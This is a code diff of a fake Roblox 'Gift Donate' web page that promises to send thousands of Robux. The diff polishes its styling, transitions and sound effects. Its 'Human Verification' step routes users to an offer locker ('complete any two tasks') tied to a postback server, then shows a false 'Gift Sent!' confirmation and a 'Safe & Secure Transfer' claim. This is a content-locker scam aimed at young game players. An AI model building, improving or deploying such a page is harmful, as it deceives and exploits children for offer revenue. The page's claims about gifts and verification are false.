@@ -2,234 +2,364 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Gift Donate</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Fredoka+One&family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Fredoka+One&family=Nunito:wght@400;600;700;900&display=swap" rel="stylesheet">
     
     <style>
-        /* --- GLOBAL STYLES --- */
-        body { margin: 0; padding: 0; font-family: 'Roboto', sans-serif; background-color: #e91e63; overflow-x: hidden; }
-        .roblox-font { font-family: 'Fredoka One', cursive; text-shadow: 2px 2px 0px rgba(0,0,0,0.2); }
-        .hidden { display: none !important; }
-        .fade-in { animation: fadeIn 0.4s ease-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        /* --- GLOBAL & PREFERENCES --- */
+        body { 
+            margin: 0; 
+            padding: 0; 
+            font-family: 'Nunito', sans-serif; 
+            background-color: #1a1a1a; /* Dark background for PC view */
+            overflow: hidden; 
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
 
-        /* --- PAGE 1: LOGIN --- */
-        .header-bar { height: 60px; display: flex; align-items: center; justify-content: space-between; padding: 0 24px; background-color: #e91e63; }
+        /* --- DEVICE FRAME / OUTLINE (Request #1) --- */
+        .app-container {
+            width: 100%;
+            max-width: 450px; /* Mobile width constraint for PC */
+            height: 100%;
+            max-height: 850px; /* Height constraint */
+            background-color: #fff;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 0 50px rgba(0,0,0,0.5);
+            display: flex;
+            flex-direction: column;
+        }
+
+        @media (min-width: 768px) {
+            .app-container {
+                border-radius: 20px;
+                border: 8px solid #2d2d2d; /* The Outline */
+                height: 90vh;
+            }
+        }
+
+        /* --- VISUALS & ANIMATIONS (Request #3) --- */
+        .roblox-font { font-family: 'Fredoka One', cursive; letter-spacing: 0.5px; }
+        .hidden { display: none !important; }
         
-        .input-box { background-color: #f1f2f6; border: 2px solid #e1e1e1; border-radius: 12px; padding: 14px; margin-bottom: 22px; }
-        .input-box input { width: 100%; background: transparent; border: none; outline: none; font-size: 16px; color: #444; font-weight: 500; }
+        /* Smooth Page Transitions */
+        .screen {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            overflow-y: auto;
+            background: #fff;
+            transition: transform 0.4s cubic-bezier(0.4, 0.0, 0.2, 1), opacity 0.4s;
+            opacity: 0;
+            pointer-events: none;
+            transform: scale(0.95);
+        }
+        .screen.active {
+            opacity: 1;
+            pointer-events: auto;
+            transform: scale(1);
+            z-index: 10;
+        }
+
+        /* 3D Button Effects (Pls Donate Style) */
+        .btn-3d {
+            transition: transform 0.1s, border-bottom-width 0.1s;
+        }
+        .btn-3d:active {
+            transform: translateY(4px);
+            border-bottom-width: 0px !important;
+            margin-bottom: 4px; /* To prevent layout jump */
+        }
+
+        /* --- PAGE 1: LOGIN STYLES --- */
+        .header-bg { 
+            background: linear-gradient(135deg, #e91e63, #c2185b);
+            border-bottom: 4px solid #880e4f;
+        }
         
-        .label-text { font-size: 12px; font-weight: 900; color: #9ca3af; text-transform: uppercase; margin-bottom: 6px; display: block; letter-spacing: 0.5px; }
+        .input-group {
+            background-color: #f3f4f6;
+            border: 2px solid #e5e7eb;
+            border-radius: 16px;
+            padding: 12px;
+            margin-bottom: 20px;
+            transition: 0.2s;
+        }
+        .input-group:focus-within {
+            border-color: #e91e63;
+            background-color: #fff;
+            box-shadow: 0 4px 12px rgba(233, 30, 99, 0.15);
+        }
+        .input-group input { width: 100%; background: transparent; border: none; outline: none; font-size: 16px; color: #374151; font-weight: 700; }
+        
+        .label-text { font-size: 13px; font-weight: 900; color: #6b7280; text-transform: uppercase; margin-bottom: 8px; display: block; letter-spacing: 0.8px; }
         
         .btn-blue {
-            background-color: #1a73e8; color: white; width: 100%; padding: 18px; 
-            border-radius: 14px; font-size: 19px; font-weight: 900; text-transform: uppercase; 
-            letter-spacing: 1px; box-shadow: 0 5px 0 #0d47a1; border: none; cursor: pointer; transition: 0.1s;
+            background-color: #3b82f6; 
+            color: white; 
+            width: 100%; 
+            padding: 16px; 
+            border-radius: 16px; 
+            font-size: 20px; 
+            font-family: 'Fredoka One', cursive;
+            text-transform: uppercase; 
+            letter-spacing: 1px; 
+            border-bottom: 6px solid #1d4ed8; /* 3D effect */
+            cursor: pointer; 
         }
-        .btn-blue:active { transform: translateY(5px); box-shadow: none; }
-        .btn-blue:disabled { background-color: #8ab4f8; cursor: wait; box-shadow: none; transform: none; }
 
-        /* Toggle */
-        .gift-wrap { display: flex; justify-content: space-between; align-items: center; background-color: #f1f2f6; padding: 16px; border-radius: 12px; border: 2px solid #e1e1e1; margin-bottom: 24px; }
-        .toggle-bg { position: relative; width: 52px; height: 30px; background-color: #2ecc71; border-radius: 30px; cursor: pointer; transition: 0.3s; }
-        .toggle-bg.off { background-color: #ccc; }
-        .toggle-dot { position: absolute; top: 4px; right: 4px; width: 22px; height: 22px; background-color: white; border-radius: 50%; transition: 0.3s; }
-        .toggle-bg.off .toggle-dot { right: 26px; }
+        /* Gift Toggle */
+        .gift-wrap { display: flex; justify-content: space-between; align-items: center; background-color: #ecfdf5; padding: 12px 16px; border-radius: 16px; border: 2px solid #a7f3d0; margin-bottom: 24px; }
+        .toggle-bg { position: relative; width: 56px; height: 32px; background-color: #10b981; border-radius: 30px; cursor: pointer; transition: 0.3s; box-shadow: inset 0 2px 4px rgba(0,0,0,0.1); }
+        .toggle-bg.off { background-color: #d1d5db; }
+        .toggle-dot { position: absolute; top: 4px; right: 4px; width: 24px; height: 24px; background-color: white; border-radius: 50%; transition: 0.3s; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
+        .toggle-bg.off .toggle-dot { right: 28px; }
 
-        /* --- PAGE 2: STAND --- */
-        .wood-leg { position: fixed; bottom: 0; width: 42px; height: 85vh; background-color: #8d5e3a; z-index: 0; border-radius: 6px 6px 0 0; }
-        .wood-plank { background-color: #b37a4c; border-bottom: 8px solid #8d5e3a; border-radius: 8px; position: relative; z-index: 10; box-shadow: 0 6px 12px rgba(0,0,0,0.25); }
+        /* --- PAGE 2: STAND STYLES --- */
+        .wood-leg { position: fixed; bottom: 0; width: 30px; height: 100%; background: repeating-linear-gradient(90deg, #8d5e3a, #7a4e2e 10px); z-index: 0; border-radius: 8px; border: 2px solid #5d3a22; }
+        .wood-plank { 
+            background-image: url('https://www.transparenttextures.com/patterns/wood-pattern.png'); /* Subtle texture */
+            background-color: #b37a4c; 
+            border: 3px solid #6d4c41;
+            border-bottom: 8px solid #5d4037; 
+            border-radius: 12px; 
+            position: relative; 
+            z-index: 10; 
+            box-shadow: 0 10px 20px rgba(0,0,0,0.3); 
+        }
 
         .btn-robux {
-            background-color: #2e7d32; border-bottom: 5px solid #1b5e20; color: white; font-weight: 700;
-            border-radius: 8px; padding: 10px; display: flex; align-items: center; justify-content: center;
-            gap: 6px; transition: 0.1s; font-size: 15px; width: 100%;
+            background-color: #4caf50; 
+            border-bottom: 5px solid #2e7d32; 
+            color: white; 
+            font-weight: 800;
+            border-radius: 12px; 
+            padding: 12px 5px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+            gap: 6px; 
+            font-size: 14px; 
+            width: 100%;
+            text-shadow: 1px 1px 0 rgba(0,0,0,0.2);
         }
-        .btn-robux:active { transform: translateY(5px); border-bottom-width: 0; }
 
         /* --- MODALS --- */
-        .modal-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: flex; align-items: center; justify-content: center; z-index: 100; opacity: 0; pointer-events: none; transition: opacity 0.3s; }
+        .modal-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(4px); display: flex; align-items: center; justify-content: center; z-index: 100; opacity: 0; pointer-events: none; transition: opacity 0.3s; }
         .modal-bg.active { opacity: 1; pointer-events: auto; }
         
-        .card-dark { background-color: #333; width: 90%; max-width: 380px; border-radius: 18px; overflow: hidden; color: white; transform: scale(0.95); transition: transform 0.2s; }
+        .card-dark { background-color: #1f2937; width: 90%; max-width: 380px; border-radius: 24px; overflow: hidden; color: white; transform: scale(0.9); transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); border: 2px solid #374151; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); }
         .modal-bg.active .card-dark { transform: scale(1); }
         
-        .card-light { background-color: white; width: 90%; max-width: 380px; border-radius: 20px; overflow: hidden; transform: scale(0.95); transition: transform 0.2s; max-height: 90vh; display: flex; flex-direction: column; }
+        .card-light { background-color: white; width: 90%; max-width: 380px; border-radius: 24px; overflow: hidden; transform: scale(0.9); transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); max-height: 85%; display: flex; flex-direction: column; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25); }
         .modal-bg.active .card-light { transform: scale(1); }
 
-        /* --- OFFER STYLING --- */
-        .offer-card { background: #f9f9f9; border: 1px solid #ddd; border-radius: 10px; padding: 12px; margin-bottom: 10px; cursor: pointer; transition: 0.2s; display: flex; flex-direction: column; gap: 4px; position: relative; }
-        .offer-card:hover { border-color: #e91e63; background: #fff5f8; }
-        .offer-card h4 { font-weight: 700; color: #333; font-size: 14px; margin: 0; }
-        .offer-card p { font-size: 11px; color: #666; margin: 0; }
-        .offer-card .offer-btn { margin-top: 8px; background: #e91e63; color: white; font-size: 12px; font-weight: 700; text-align: center; padding: 6px; border-radius: 6px; }
+        /* --- OFFER STYLING (Request #4 - Fixed Height) --- */
+        /* Wrapper for the scrollable area */
+        .offers-scroll-container {
+            max-height: 320px; /* FIXED HEIGHT */
+            overflow-y: auto;  /* ENABLE SCROLL INSIDE */
+            padding-right: 5px; /* prevent scrollbar overlap */
+        }
         
-        /* NEW HOT STICKER STYLE */
+        /* Scrollbar Styling */
+        .offers-scroll-container::-webkit-scrollbar { width: 6px; }
+        .offers-scroll-container::-webkit-scrollbar-track { background: #f1f1f1; border-radius: 4px; }
+        .offers-scroll-container::-webkit-scrollbar-thumb { background: #e91e63; border-radius: 4px; }
+
+        .offer-card { 
+            background: #fff; 
+            border: 2px solid #f3f4f6; 
+            border-bottom: 4px solid #e5e7eb;
+            border-radius: 12px; 
+            padding: 14px; 
+            margin-bottom: 12px; 
+            cursor: pointer; 
+            transition: 0.2s; 
+            display: flex; 
+            flex-direction: column; 
+            gap: 4px; 
+            position: relative; 
+        }
+        .offer-card:hover { border-color: #e91e63; transform: translateY(-2px); }
+        .offer-card:active { transform: translateY(1px); border-bottom-width: 2px; }
+        
         .hot-sticker {
-            position: absolute; top: -8px; left: 10px;
-            background: #ff4d4d; color: white; padding: 2px 10px;
-            border-radius: 4px; font-size: 10px; font-weight: 900;
+            position: absolute; top: -10px; right: 10px; left: auto; /* Moved to right for better look */
+            background: linear-gradient(45deg, #ff4d4d, #f44336); color: white; padding: 4px 8px;
+            border-radius: 20px; font-size: 10px; font-weight: 900;
             text-transform: uppercase; z-index: 5;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+            transform: rotate(5deg);
         }
 
-        .progress-bar-bg { height: 8px; background: #eee; border-radius: 10px; overflow: hidden; margin-bottom: 15px; }
-        .progress-fill { height: 100%; width: 0%; background: #e91e63; transition: 0.5s; }
-
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #e91e63; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #e91e63; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.8s linear infinite; margin: 0 auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div id="screen-login" class="fade-in min-h-screen bg-white flex flex-col">
-        <div class="header-bar">
-            <span class="text-white font-black text-2xl tracking-tighter">GIFT</span>
-            <span class="text-white text-3xl cursor-pointer">✕</span>
-        </div>
+    <audio id="sfx-click" src="data:audio/wav;base64,UklGRi4AAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAACAAEA/v///wAAAAD//wAA/v/+/wAAAQACAAIA///+/wEAAQAAAAEAAAD//wAAAgABAAAA//8BAAAAAQABAAAAAQAAAP//AQABAAAA//8BAAIA//8AAAAAAQABAAAA//8BAAEA//8AAAAAAQABAAAA//8AAAAAAQABAAAA//8AAAAAAQABAAAA//8BAAAAAQABAAAA//8BAAAAAQAAAAAAAQABAAAA//8BAAAAAQAAAAAAAQABAAAA//8BAAAAAQAAAAAAAQAAAAAAAQAAAAAAAQAAAAAAAQAAAA=="></audio>
+    
+    <audio id="sfx-btn" src="data:audio/wav;base64,UklGRjIAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAA=="></audio>
 
-        <div class="flex-1 flex flex-col items-center px-6 pt-10">
-            <h1 class="text-[#333] text-xl font-bold uppercase tracking-wide">Offline Donations</h1>
-            <p class="text-gray-500 text-center text-sm mt-3 mb-10 leading-relaxed max-w-xs">
-                Donate to people outside your server or offline by sending gifts! We'll tell them when they join the game!
-            </p>
-
-            <div class="w-full max-w-sm">
-                <label class="label-text">Send To</label>
-                <div class="input-box">
-                    <input type="text" id="username-input" placeholder="Username">
+    <div class="app-container">
+        
+        <div id="screen-login" class="screen active flex flex-col">
+            <div class="header-bg p-4 flex justify-between items-center shadow-md z-10">
+                <div class="flex items-center gap-2">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="24" class="animate-bounce">
+                    <span class="text-white roblox-font text-2xl tracking-tight shadow-text">GIFT DONATE</span>
                 </div>
-
-                <label class="label-text">Message (Optional)</label>
-                <div class="input-box">
-                    <input type="text" placeholder="Message">
-                </div>
-
-                <div class="gift-wrap">
-                    <div class="flex items-center gap-3">
-                        <span class="font-bold text-gray-600 text-sm">GIFT WRAPPING</span>
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="20">
-                    </div>
-                    <div class="toggle-bg" id="gift-toggle" onclick="this.classList.toggle('off')">
-                        <div class="toggle-dot"></div>
-                    </div>
-                </div>
-
-                <button id="btn-proceed" onclick="handleUserCheck()" class="btn-blue">PROCEED</button>
+                <span class="text-white text-2xl cursor-pointer opacity-80 hover:opacity-100 transition" onclick="playSfx('click')">✕</span>
             </div>
-        </div>
-    </div>
-    <div id="screen-stand" class="hidden min-h-screen flex flex-col items-center pt-24 fade-in relative">
-        <div class="wood-leg" style="left: 25px;"></div>
-        <div class="wood-leg" style="right: 25px;"></div>
 
-        <div class="wood-plank px-10 py-3 mb-6">
-            <h1 id="stand-title" class="text-white text-2xl roblox-font drop-shadow-md">User's Stand</h1>
-        </div>
-
-        <div class="z-20 mb-6 h-44 w-44">
-            <img id="stand-avatar" src="https://slelguoygbfzlpylpxfs.supabase.co/storage/v1/render/image/public/project-uploads/8c757f06-70fb-4925-b654-33a0a1a38e37/image-1768457594705.png?width=8000&height=8000&resize=contain" class="w-full h-full object-contain drop-shadow-2xl">
-        </div>
-
-        <div class="wood-plank w-[94%] max-w-sm py-8 flex justify-between gap-3 px-4">
-            <button onclick="showConfirm(2500)" class="btn-robux">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="16"> 2,500
-            </button>
-            <button onclick="showConfirm(5000)" class="btn-robux">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="16"> 5,000
-            </button>
-            <button onclick="showConfirm(10000)" class="btn-robux">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="16"> 10,000
-            </button>
-        </div>
-
-        <div class="wood-plank w-[90%] max-w-sm h-16 mt-10"></div>
-    </div>
-
-    <div id="modal-confirm" class="modal-bg">
-        <div class="card-dark">
-            <div class="p-4 border-b border-gray-600">
-                <h3 class="font-bold text-lg">Gift Confirmation</h3>
-            </div>
-            <div class="p-8 flex flex-col items-center">
-                <div class="w-28 h-28 rounded-full bg-gray-700 border-[5px] border-gray-600 overflow-hidden mb-5 shadow-lg relative">
-                    <img id="confirm-avatar" src="https://slelguoygbfzlpylpxfs.supabase.co/storage/v1/render/image/public/project-uploads/8c757f06-70fb-4925-b654-33a0a1a38e37/image-1768457594705.png?width=8000&height=8000&resize=contain" class="w-full h-full object-cover">
-                </div>
-                <p class="text-center text-lg mb-8 leading-snug">
-                    Would you like to gift <span id="confirm-amt" class="font-bold">10,000</span> Robux to "<span id="confirm-name">user</span>"?
+            <div class="flex-1 flex flex-col items-center px-6 pt-8 overflow-y-auto">
+                <h1 class="text-gray-800 text-2xl roblox-font uppercase tracking-wide mb-2">Offline Donation</h1>
+                <p class="text-gray-500 text-center text-sm font-semibold mb-8 leading-relaxed max-w-xs">
+                    Donate to people outside your server or offline by sending gifts! We'll tell them when they join the game!
                 </p>
-                <div class="flex gap-4 w-full">
-                    <button onclick="closeModals()" class="flex-1 bg-gray-500 text-white font-bold py-3 rounded-xl hover:bg-gray-600 transition">Cancel</button>
-                    <button onclick="showCaptcha()" class="flex-1 bg-white text-black font-bold py-3 rounded-xl flex justify-center items-center gap-2 hover:bg-gray-200 transition">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="18">
-                        <span id="btn-final-amt">10,000</span>
+
+                <div class="w-full max-w-sm">
+                    <label class="label-text">Send to</label>
+                    <div class="input-group">
+                        <input type="text" id="username-input" placeholder="Enter Username..." onfocus="playSfx('click')">
+                    </div>
+
+                    <label class="label-text">Message (Optional)</label>
+                    <div class="input-group">
+                        <input type="text" placeholder="Enter Message..." onfocus="playSfx('click')">
+                    </div>
+
+                    <div class="gift-wrap">
+                        <div class="flex items-center gap-3">
+                            <span class="font-bold text-emerald-700 text-sm">ADD GIFT WRAP</span>
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="20">
+                        </div>
+                        <div class="toggle-bg" id="gift-toggle" onclick="toggleSwitch(this)">
+                            <div class="toggle-dot"></div>
+                        </div>
+                    </div>
+
+                    <button id="btn-proceed" onclick="handleUserCheck()" class="btn-blue btn-3d mt-4 shadow-lg">
+                        PROCEED
                     </button>
+                    
+                    <p class="text-xs text-center text-gray-400 mt-6 font-bold">Safe & Secure Transfer</p>
                 </div>
             </div>
         </div>
-    </div>
 
-    <div id="modal-captcha" class="modal-bg">
-        <div class="card-light">
-            <div class="bg-[#e91e63] p-5 flex justify-between items-center text-white shrink-0">
-                <span id="captcha-header-text" class="font-bold text-lg">HUMAN VERIFICATION</span>
-                <span onclick="closeModals()" class="cursor-pointer font-bold text-xl opacity-80 hover:opacity-100">✕</span>
+        <div id="screen-stand" class="screen flex flex-col items-center pt-20">
+            <div class="wood-leg" style="left: 30px;"></div>
+            <div class="wood-leg" style="right: 30px;"></div>
+
+            <div class="wood-plank px-12 py-4 mb-4 transform rotate-1">
+                <h1 id="stand-title" class="text-white text-2xl roblox-font drop-shadow-md text-center">User's Stand</h1>
             </div>
-            
-            <div id="captcha-step-1" class="p-10 bg-white text-center">
-                <img src="https://cdn.discordapp.com/attachments/1456230918347034709/1462278005387821237/shield.png?ex=696d9c04&is=696c4a84&hm=6b22dec6bafc53265fce0fc4ddd7e6d96f9ed39438f95f8ab4b09aae9fb3ef2d&animated=true" class="w-16 mx-auto mb-4 opacity-80" alt="Shield">
-                <h2 class="text-xl font-bold text-gray-800 mb-2">Manual Verification Required</h2>
-                <p class="text-sm text-gray-500 mb-8">Please complete verification by clicking button below.</p>
+
+            <div class="z-20 mb-8 h-48 w-48 relative group">
+                <div class="absolute inset-0 bg-white opacity-20 blur-xl rounded-full group-hover:opacity-30 transition"></div>
+                <img id="stand-avatar" src="" class="w-full h-full object-contain drop-shadow-2xl transition transform group-hover:scale-105 duration-300">
+            </div>
+
+            <div class="wood-plank w-[90%] max-w-sm py-6 flex justify-between gap-3 px-5 mb-auto">
+                <button onclick="showConfirm(2500); playSfx('btn')" class="btn-robux btn-3d active:scale-95">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="18"> 2,500
+                </button>
+                <button onclick="showConfirm(5000); playSfx('btn')" class="btn-robux btn-3d active:scale-95">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="18"> 5,000
+                </button>
+                <button onclick="showConfirm(10000); playSfx('btn')" class="btn-robux btn-3d active:scale-95">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="18"> 10,000
+                </button>
+            </div>
+
+            <div class="wood-plank w-[85%] max-w-sm h-12 mt-4 mb-10 opacity-90"></div>
+        </div>
+
+        <div id="modal-confirm" class="modal-bg">
+            <div class="card-dark">
+                <div class="p-5 border-b border-gray-700 bg-[#252f3f]">
+                    <h3 class="font-bold text-xl roblox-font text-white tracking-wide">CONFIRM GIFT</h3>
+                </div>
+                <div class="p-6 flex flex-col items-center">
+                    <div class="w-24 h-24 rounded-full bg-gray-800 border-4 border-gray-600 overflow-hidden mb-5 shadow-inner relative">
+                        <img id="confirm-avatar" src="" class="w-full h-full object-cover">
+                    </div>
+                    <p class="text-center text-gray-300 text-lg mb-8 leading-snug">
+                        Would you like to gift <span id="confirm-amt" class="font-black text-[#4caf50]">10,000</span> Robux to <br>"<span id="confirm-name" class="text-white font-bold">user</span>"?
+                    </p>
+                    <div class="flex gap-3 w-full">
+                        <button onclick="closeModals(); playSfx('click')" class="flex-1 bg-gray-600 border-b-4 border-gray-700 text-white font-bold py-3 rounded-xl active:border-b-0 active:translate-y-1 transition">CANCEL</button>
+                        <button onclick="showCaptcha(); playSfx('btn')" class="flex-1 bg-white border-b-4 border-gray-300 text-black font-bold py-3 rounded-xl flex justify-center items-center gap-2 active:border-b-0 active:translate-y-1 transition">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" width="18">
+                            <span id="btn-final-amt">10,000</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="modal-captcha" class="modal-bg">
+            <div class="card-light flex flex-col h-full max-h-[500px]"> <div class="bg-[#e91e63] p-4 flex justify-between items-center text-white shrink-0 shadow-md z-10">
+                    <span id="captcha-header-text" class="font-black text-lg roblox-font tracking-wide">HUMAN VERIFICATION</span>
+                    <span onclick="closeModals(); playSfx('click')" class="cursor-pointer font-bold text-xl opacity-80 hover:opacity-100">✕</span>
+                </div>
                 
-                <div class="flex flex-col gap-3">
-                    <button onclick="executeLocker()" class="bg-[#e91e63] text-white font-black py-4 rounded-xl shadow-lg active:scale-95 transition">START VERIFICATION</button>
-                    <button onclick="closeModals()" class="bg-gray-100 text-gray-600 font-bold py-3 rounded-xl active:scale-95 transition">CANCEL</button>
-                </div>
-            </div>
-
-            <div id="offer-step" class="hidden p-6 overflow-y-auto bg-white">
-                <div class="text-center mb-4">
-                    <p class="text-sm font-bold text-gray-700">Complete any two tasks from below in order to verify and receive your gift</p>
-                    <p class="text-xs text-gray-500">The progress bar will update automatically. (if it does not update, just try another task)</p>
+                <div id="captcha-step-1" class="p-8 bg-white text-center flex-1 flex flex-col justify-center">
+                    <img src="https://cdn.discordapp.com/attachments/1456230918347034709/1462278005387821237/shield.png?ex=696d9c04&is=696c4a84&hm=6b22dec6bafc53265fce0fc4ddd7e6d96f9ed39438f95f8ab4b09aae9fb3ef2d&animated=true" class="w-20 mx-auto mb-4 opacity-90 drop-shadow-md" alt="Shield">
+                    <h2 class="text-xl font-bold text-gray-800 mb-2">MANUAL VERIFICATION REQUIRED</h2>
+                    <p class="text-sm text-gray-500 mb-8 px-4">To prevent spam, please complete a quick manual verification.</p>
+                    
+                    <div class="flex flex-col gap-3 w-full">
+                        <button onclick="executeLocker(); playSfx('btn')" class="bg-[#e91e63] border-b-4 border-[#ad1457] text-white font-black py-4 rounded-xl shadow-lg active:border-b-0 active:translate-y-1 transition text-lg">VERIFY NOW</button>
+                    </div>
                 </div>
 
-                <div class="progress-bar-bg">
-                    <div id="progress-fill" class="progress-fill"></div>
-                </div>
-                <div class="flex justify-between items-center mb-4">
-                    <p class="text-[10px] font-bold text-gray-400">STATUS: <span id="comp-count">0</span>/2 COMPLETED</p>
+                <div id="offer-step" class="hidden flex-1 flex flex-col overflow-hidden bg-gray-50">
+                    <div class="p-4 bg-white border-b border-gray-200 shrink-0 z-10 shadow-sm">
+                        <p class="text-xs font-bold text-gray-700 text-center mb-2">Complete any two tasks from below in order to verify and receive your gift</p>
+                        <p class="text-xs text-gray-500">The progress bar will update automatically. (if it does not update, just try another task)</p>
+                        <div class="w-full bg-gray-200 rounded-full h-3">
+                            <div id="progress-fill" class="bg-[#e91e63] h-3 rounded-full transition-all duration-500" style="width: 0%"></div>
+                        </div>
+                        <p class="text-[10px] text-center text-gray-400 mt-1 font-bold tracking-wider">STATUS: <span id="comp-count">0</span>/2 Completed</p>
+                    </div>
+
+                    <div id="offers-list" class="offers-scroll-container p-4 flex-1">
+                        </div>
+
+                    <div id="loading-offers" class="py-10 text-center hidden">
+                        <div class="spinner"></div>
+                        <p class="text-xs text-gray-400 mt-3 font-bold">LOADING TASKS...</p>
+                    </div>
+
+                    <div class="p-3 bg-white border-t border-gray-200 shrink-0 text-center">
+                        <button onclick="fetchOffers(); playSfx('click')" class="text-[#e91e63] text-xs font-bold hover:underline">
+                            REFRESH LIST
+                        </button>
+                    </div>
                 </div>
 
-                <div id="loading-offers" class="py-4 text-center">
-                    <div class="spinner"></div>
-                    <p class="text-xs text-gray-400 mt-2">Fetching local tasks...</p>
+                <div id="success-step" class="hidden p-10 text-center bg-white flex-1 flex flex-col justify-center items-center">
+                    <div class="w-20 h-20 bg-green-100 text-green-500 rounded-full flex items-center justify-center mb-4 shadow-lg animate-bounce">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7" />
+                        </svg>
+                    </div>
+                    <h3 class="text-2xl font-black text-gray-800">Gift Sent!</h3>
+                    <p class="text-sm text-gray-500 mt-2">The Robux have been queued for delivery.</p>
+                    <button onclick="closeModals(); playSfx('click')" class="mt-8 w-full bg-[#e91e63] text-white font-bold py-3 rounded-xl shadow-lg">CLOSE</button>
                 </div>
-
-                <div id="offers-list"></div>
-
-                <div class="text-center mt-6">
-                    <button onclick="fetchOffers()" class="w-full py-3 bg-transparent border border-[#e91e63] text-[#e91e63] rounded-xl font-bold text-sm hover:bg-[#fff5f8] transition active:scale-95">
-                        REFRESH TASKS
-                    </button>
-                </div>
-            </div>
-
-            <div id="success-step" class="hidden p-10 text-center bg-white">
-                <div class="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7" />
-                    </svg>
-                </div>
-                <h3 class="text-xl font-bold text-gray-800">Gift Sent!</h3>
-                <p class="text-sm text-gray-500 mt-2">Verification successful. The Robux are being delivered to the user.</p>
-                <button onclick="closeModals()" class="mt-6 w-full bg-[#e91e63] text-white font-bold py-3 rounded-xl">CLOSE</button>
             </div>
         </div>
-    </div>
 
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
+    </div> <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
     <script>
         // --- POSTBACK CONFIG ---
         const SERVER_URL = "https://your-wispbyte-domain.com"; 
@@ -239,17 +369,51 @@
         let userData = { id: 123456, name: "", avatar: "https://slelguoygbfzlpylpxfs.supabase.co/storage/v1/render/image/public/project-uploads/8c757f06-70fb-4925-b654-33a0a1a38e37/image-1768457594705.png?width=8000&height=8000&resize=contain" };
         let completedOffers = 0;
 
-        // MAIN HANDLER
+        // --- SOUND EFFECTS ---
+        function playSfx(type) {
+            // Simple robust sound player
+            const audio = document.getElementById(type === 'btn' ? 'sfx-btn' : 'sfx-click');
+            if(audio) {
+                audio.currentTime = 0;
+                audio.play().catch(e => console.log("Audio play prevented: user interaction required first"));
+            }
+        }
+
+        // --- TOGGLE SWITCH ---
+        function toggleSwitch(el) {
+            playSfx('click');
+            el.classList.toggle('off');
+        }
+
+        // --- PAGE NAVIGATION ---
+        function switchScreen(hideId, showId) {
+            const hideEl = document.getElementById(hideId);
+            const showEl = document.getElementById(showId);
+
+            hideEl.classList.remove('active');
+            
+            setTimeout(() => {
+                showEl.classList.add('active');
+            }, 300); // Wait for transition
+        }
+
+        // --- MAIN LOGIC ---
         function handleUserCheck() {
